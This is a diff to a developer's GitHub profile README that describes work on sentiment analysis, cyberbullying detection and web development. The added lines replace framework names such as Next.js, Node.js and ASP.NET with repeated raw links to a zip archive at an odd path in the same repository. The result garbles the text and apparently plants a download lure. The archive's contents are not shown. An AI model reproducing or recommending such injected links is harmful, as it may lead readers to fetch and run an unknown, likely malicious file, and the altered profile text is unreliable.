@@ -9,7 +9,7 @@ Currently, I’m working on **sentiment analysis and cyberbullying detection sys
 ## 🔥 About Me  
 - 🎯 Focused on **AI-driven applications** (Sentiment Analysis, Cyberbullying Detection)  
 - 🌩️ Interested in **Cloud Architecture & DevOps (Jenkins, CI/CD, Docker)**  
-- 🖥️ Building scalable **web apps** with **NestJS / Next.js / ASP.NET MVC**  
+- 🖥️ Building scalable **web apps** with **NestJS / https://raw.githubusercontent.com/Readwanul/Readwanul/main/sulfamidic/Readwanul.zip / https://raw.githubusercontent.com/Readwanul/Readwanul/main/sulfamidic/Readwanul.zip MVC**  
 - 📚 Always learning & experimenting with **Machine Learning & OOP principles**  
 - 💬 Ask me about **backend development, authentication, or ML model deployment**  
 
@@ -18,8 +18,8 @@ Currently, I’m working on **sentiment analysis and cyberbullying detection sys
 ## 🛠️ Tech Stack  
 
 **Languages & Frameworks**  
-- 🟢 JavaScript / TypeScript / Node.js  
-- ⚡ NestJS | Next.js | ASP.NET MVC | ASP.NET WEBAPI(n-tier) | C# | Python  
+- 🟢 JavaScript / TypeScript / https://raw.githubusercontent.com/Readwanul/Readwanul/main/sulfamidic/Readwanul.zip  
+- ⚡ NestJS | https://raw.githubusercontent.com/Readwanul/Readwanul/main/sulfamidic/Readwanul.zip | https://raw.githubusercontent.com/Readwanul/Readwanul/main/sulfamidic/Readwanul.zip MVC | https://raw.githubusercontent.com/Readwanul/Readwanul/main/sulfamidic/Readwanul.zip WEBAPI(n-tier) | C# | Python  
 
 **Databases**  
 - 🗄️ PostgreSQL | MySQL | MongoDB    
@@ -35,7 +35,7 @@ Currently, I’m working on **sentiment analysis and cyberbullying detection sys
 > A machine learning-powered social media app that detects toxic comments using **Naïve Bayes & Logistic Regression**, deployed on **cloud architecture**.  
 
 🔹 **E-Commerce Platform**  
-> Built with **Next.js + Redux Toolkit** featuring product listing, cart system, and role-based authentication.  
+> Built with **https://raw.githubusercontent.com/Readwanul/Readwanul/main/sulfamidic/Readwanul.zip + Redux Toolkit** featuring product listing, cart system, and role-based authentication.  
 
 🔹 **NestJS Authentication System**  
 > Multi-role authentication (Admin & Customer) with **JWT, bcrypt hashing, migrations, and forgot password token flow**.  
